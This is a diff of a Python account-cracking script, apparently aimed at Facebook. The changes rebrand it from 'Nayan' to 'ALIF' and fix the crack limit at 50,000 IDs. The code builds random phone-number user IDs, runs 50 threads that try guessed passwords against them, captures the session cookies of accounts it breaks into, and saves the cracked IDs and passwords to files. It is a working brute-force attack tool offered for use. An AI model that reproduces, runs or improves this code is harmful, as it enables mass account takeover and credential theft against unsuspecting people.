@@ -178,24 +178,21 @@ def xr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    jalan('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mBD CODE : \033[1;97m016 \033[1;92m, \033[1;97m017 \033[1;92m, \033[1;97m018 \033[1;92m, \033[1;97m019')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    code = input('\033[97;1m[\033[92;1m?\033[97;1m]\033[97;1mENTER CODE  \033[38;5;196m:\033[97;1m ')
-    os.system('clear')
-    print(logo)
-    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m1000\033[1;97m/\033[1;34m2000\033[1;97m/\033[1;32m3000\n \033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 \033[1;91m<>\033[1;92m 92302 \033[1;91m<>\033[1;92m 92301 \033[1;91m<<')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Choose \033[1;91m>>\033[1;92m ')
+    limit = 50000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     os.system("clear")
     print(logo)
     passx = 0
-    Nayan = []
+    RimonID = []
     print("")
     for bilal in range(passx):
         pww = 0
-        Nayan.append(pww)
+        RimonID.append(pww)
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
@@ -203,19 +200,18 @@ def xr():
         print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
         print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
         print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
-	    for love in user:
+        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><'),
+        for love in user:
             pwx = [love[1:]]
             uid = code+love
-            for Eman in Nayan:
+            for Eman in RimonID:
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
-    print('\nIDS SAVED IN Nayan_OK.txt')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    
+    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in 𝑨𝑳𝑰𝑭/ok.txt,𝑨𝑳𝑰𝑭/cp.txt')
+    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
 
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -258,7 +254,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(' \n\033[1;97m[\033[1;92mNAYAN-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m➡️\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
+                print(' \n\033[1;97m[\033[1;92m𝑨𝑳𝑰𝑭-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
                 open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
@@ -272,7 +268,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r \033[1;91m[\033[1;97m{uid}\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
+        sys.stdout.write('\r \033[1;91m[\033[1;97m𝑨𝑳𝑰𝑭\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
         sys.stdout.flush()
     except:
         pass
